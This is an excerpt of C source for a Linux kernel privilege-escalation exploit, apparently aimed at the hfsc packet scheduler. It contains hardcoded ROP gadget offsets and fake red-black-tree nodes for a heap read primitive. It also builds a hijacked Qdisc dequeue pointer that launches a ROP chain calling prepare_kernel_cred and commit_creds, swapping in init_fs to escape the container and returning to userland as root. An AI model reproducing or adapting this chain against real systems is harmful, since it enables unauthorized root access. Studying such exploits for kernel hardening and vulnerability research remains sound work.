...
static const u32 struct_hfsc_class_member_el_node_offset = 152;
...
static u64 init_fs = 0x26919c0;

static u64 push_rbx_pop_rsp_pop_rbp = 0xe1379;
static u64 mov_qword_ptr_rax_rsi_ret = 0xa585f6;
static u64 mov_rdi_rax_rep_ret = 0x12b1aeb;
static u64 pop_rdi_ret = 0x877f0;
static u64 pop_rcx_ret = 0xa2deb;
static u64 pop_rsi_ret = 0xd0017e;
static u64 add_rax_rcx_ret = 0xe3df4;

static u64 prepare_kernel_cred = 0x1162b0;
static u64 commit_creds = 0x1167d0;

static u64 find_task_by_vpid = 0x10d6e0;
...
bool heap_read_primitive_build_primitive(struct heap_read_primitive *heap_read_primitive)
{
	...
	*fake_cl_e = 0;
	...
	fake_rb_node->__rb_parent_color = 0 | RB_RED;
	fake_rb_node->rb_right = (struct rb_node *)(0);
	fake_rb_node->rb_left = (struct rb_node *)(0);
...
void code_execution_primitive_build_primitive(struct code_execution_primitive *code_execution_primitive)
{
	...
	*fake_cl_e = 0;
	...
	memset(user_key_payload_write_buffer, 0xff, sizeof(user_key_payload_write_buffer));
	fake_dequeue = (u64 *)(user_key_payload_write_buffer + struct_Qdisc_member_dequeue_offset);

	static u64 pop_rsp_ret = 0xffffffff8110bcc5;
	static u64 pop_rbp_ret = 0xffffffff8108775f;
	static u64 pop_rcx_ret = 0xffffffff81436fe2;

	*fake_dequeue = pop_rsp_ret; // when trigger code execution, rbx point to rop[16], 'pop rbp' step will bring us to rop[17]
	...
	rop[18] = pop_rdi_ret;
	rop[19] = init_task;
	rop[20] = prepare_kernel_cred; // root_cred = prepare_kernel_cred(&init_task)
	rop[21] = pop_rcx_ret;
	rop[22] = 0;
	rop[23] = mov_rdi_rax_rep_ret;
	rop[24] = commit_creds;
	rop[25] = pop_rdi_ret;
	rop[26] = exploit_process_pid;
	rop[27] = find_task_by_vpid;
	rop[28] = pop_rcx_ret;
	rop[29] = struct_task_struct_member_fs_offset;
	rop[30] = add_rax_rcx_ret;
	rop[31] = pop_rsi_ret;
	rop[32] = init_fs;
	rop[33] = mov_qword_ptr_rax_rsi_ret;
	rop[34] = swapgs_restore_regs_and_return_to_usermode_nopop;
	rop[35] = 0;
	rop[36] = 0;
	rop[37] = (u64)(win);
	rop[38] = user_cs;
	rop[39] = user_rflags;
	rop[40] = user_rsp & 0xffffffffffffff00;
	rop[41] = user_ss;
...
void update_kernel_address(u64 kernel_base)
{
	...
	init_fs += kernel_base;
	push_rbx_pop_rsp_pop_rbp += kernel_base;
